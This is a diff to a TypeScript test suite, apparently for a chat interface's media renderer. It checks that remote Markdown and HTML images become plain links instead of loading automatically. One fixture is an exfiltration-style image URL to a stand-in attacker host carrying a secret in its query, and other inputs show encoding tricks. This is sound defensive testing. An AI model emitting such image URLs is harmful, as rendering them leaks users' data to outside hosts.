@@ -69,14 +69,37 @@ describe('projectMediaRefs (TAL-186)', () => {
     expect(display('![c](out/chart.png)', resolver('relative/root'))).toBeNull()
   })
 
-  it('rewrites a remote MEDIA: token to its URL, and leaves remote, data and anchor images as written', () => {
+  it('links a remote MEDIA: token as a file, and leaves data, anchor and non-web images as written', () => {
     const projected = projectMediaRefs('Generated MEDIA:https://cdn.example.test/output/image.png?variant=small and MEDIA:https://cdn.example.test/media/abc123', resolver())
-    // An extensionless URL could be audio or video as well as an image: it is linked as a file, not shown as an image.
-    expect(projected?.text).toBe('Generated ![image.png](https://cdn.example.test/output/image.png?variant=small) and [abc123](https://cdn.example.test/media/abc123)')
-    expect(projected?.media.map((m) => m.kind)).toEqual(['image', 'file'])
-    for (const text of ['![remote](https://cdn.example.test/image.png)', '![data](data:image/png;base64,AAAA)', '![anchor](#figure-1)', '![empty]()', '![query](?v=2)', '![mail](mailto:a@example.test)', '![proto](//cdn.example.test/a.png)']) {
-      expect(display(text, resolver('/srv/workspaces/app'))).toBeNull()
+    // TAL-2199: a remote image never loads by itself; an extensionless URL is a file either way.
+    expect(projected?.text).toBe('Generated [image.png](https://cdn.example.test/output/image.png?variant=small) and [abc123](https://cdn.example.test/media/abc123)')
+    expect(projected?.media.map((m) => m.kind)).toEqual(['file', 'file'])
+    for (const text of ['![data](data:image/png;base64,AAAA)', '![anchor](#figure-1)', '![empty]()', '![query](?v=2)', '![mail](mailto:a@example.test)', '<img src="data:image/png;base64,AAAA">', '<img src="./api/media?path=a&amp;b=1" alt="x">']) {
+      expect(display(text, resolver('/srv/workspaces/app')), text).toBeNull()
     }
+  })
+
+  it('links every remote Markdown and HTML image instead of loading it (TAL-2199)', () => {
+    const cases: [string, string][] = [
+      ['![x](https://example.com/a.png)', '[x](https://example.com/a.png)'],
+      ['![](https://evil.example/p.png?d=SECRET)', '[evil.example](https://evil.example/p.png?d=SECRET)'],
+      ['![proto](//cdn.example.test/a.png)', '[proto](//cdn.example.test/a.png)'],
+      ['![x *y*](HTTP://example.com/a%20b.png "t")', '[x y](HTTP://example.com/a%20b.png)'],
+      ['![x][logo]\n\n[logo]: https://example.com/a.png', '[x](https://example.com/a.png)\n\n[logo]: https://example.com/a.png'],
+      ['[![build](https://img.example/b.svg)](https://ci.example)', '[build](https://ci.example)'],
+      ['<img src="https://example.com/a.png">', '[example.com](https://example.com/a.png)'],
+      ["see <IMG alt='chart' SRC='https://example.com/a.png?a=1&amp;b=2'> here", 'see [chart](https://example.com/a.png?a=1&b=2) here'],
+      ['<img src="&#104;ttps://example.com/a.png">', '[example.com](https://example.com/a.png)'],
+      ['<img src="./x.png" srcset="https://example.com/a.png 2x">', '[example.com](https://example.com/a.png)'],
+      ['<p>\n<img alt="a>b" src=https://example.com/a.png>\n</p>', '<p>\n[a\\>b](https://example.com/a.png)\n</p>'],
+    ]
+    for (const [text, expected] of cases) {
+      const projected = projectMediaRefs(text, resolver())
+      expect(projected?.text, text).toBe(expected)
+      expect(projected?.media, text).toEqual([])
+    }
+    // A local image beside a remote one still renders as an image.
+    expect(display('![a](/tmp/a.png) ![b](https://example.com/b.png)')).toBe(`![a](${A}) [b](https://example.com/b.png)`)
   })
 
   it('leaves code, HTML comments and escaped syntax literal, and asks for no media', () => {
